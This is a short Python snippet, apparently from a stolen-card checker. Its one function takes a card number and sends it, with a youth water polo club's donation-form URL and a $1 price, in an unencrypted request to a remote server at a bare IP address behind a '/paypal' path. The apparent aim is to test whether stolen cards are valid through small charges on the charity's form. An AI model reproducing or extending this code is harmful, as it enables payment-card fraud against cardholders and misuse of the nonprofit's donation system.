import requests
def chkk(ccx):
	cc=ccx.strip()
	urll="https://www.northidahowaterpolo.org/donations/donation-form/"
	price="1"
	res=requests.get(f'http://151.247.197.54:5500/paypal?cc={cc}&url={urll}&price={price}').text
	return res
